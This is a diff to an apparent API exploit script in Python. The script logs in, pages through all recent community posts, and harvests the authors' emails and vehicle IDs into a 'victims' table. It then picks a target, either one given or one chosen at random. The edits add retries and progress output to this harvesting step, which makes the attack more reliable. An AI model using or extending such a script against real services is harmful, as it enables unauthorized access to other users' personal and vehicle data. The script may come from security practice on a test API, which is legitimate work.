@@ -19,25 +19,31 @@ def login(base_url: str, email: str, password: str, timeout: float = 15) -> Opti
     except:
         return None
 
-def get_recent_posts(base_url: str, token: str, timeout: float = 15) -> List[Dict[str, Any]]:
+def get_recent_posts(base_url: str, token: str, timeout: float = 15, retries: int = 3) -> List[Dict[str, Any]]:
     url = f"{base_url.rstrip('/')}/community/api/v2/community/posts/recent"
     headers = {"Authorization": f"Bearer {token}"}
     all_posts = []
-    try:
-        limit = 500
-        offset = 0
-        while True:
-            r = requests.get(url, headers=headers, params={"limit": limit, "offset": offset}, timeout=timeout)
-            posts = r.json().get("posts") or []
-            if not posts:
-                break
-            all_posts.extend(posts)
-            if len(posts) < limit:
-                break
-            offset += limit
-        return all_posts
-    except:
-        return []
+    for attempt in range(retries):
+        try:
+            limit = 500
+            offset = 0
+            while True:
+                r = requests.get(url, headers=headers, params={"limit": limit, "offset": offset}, timeout=timeout)
+                r.raise_for_status()
+                posts = r.json().get("posts") or []
+                if not posts:
+                    break
+                all_posts.extend(posts)
+                if len(posts) < limit:
+                    break
+                offset += limit
+            return all_posts if all_posts else []
+        except Exception as e:
+            if attempt < retries - 1:
+                time.sleep(1)
+                continue
+            return all_posts
+    return all_posts
 
 def get_own_vehicles(base_url: str, token: str, timeout: float = 15) -> List[Dict[str, Any]]:
     url = f"{base_url.rstrip('/')}/identity/api/v2/vehicle/vehicles"
@@ -76,6 +82,10 @@ def main():
     time.sleep(0.5)
 
     posts = get_recent_posts(base_url, token)
+    if not posts:
+        print("[!] Failed to retrieve posts"); sys.exit(1)
+    print(f"[*] Retrieved {len(posts)} posts")
+
     victims = {}
     for post in posts:
         author = post.get("author") or {}
@@ -85,7 +95,8 @@ def main():
             victims[email] = vehicleid
 
     if not victims:
-        print("[!] No victim candidates found"); sys.exit(1)
+        print(f"[!] No victim candidates found (checked {len(posts)} posts)"); sys.exit(1)
+    print(f"[+] Found {len(victims)} possible victims")
 
     victim_email = args.victim_email if args.victim_email else random.choice(list(victims.keys()))
     victim_vehicle_id = victims.get(victim_email)
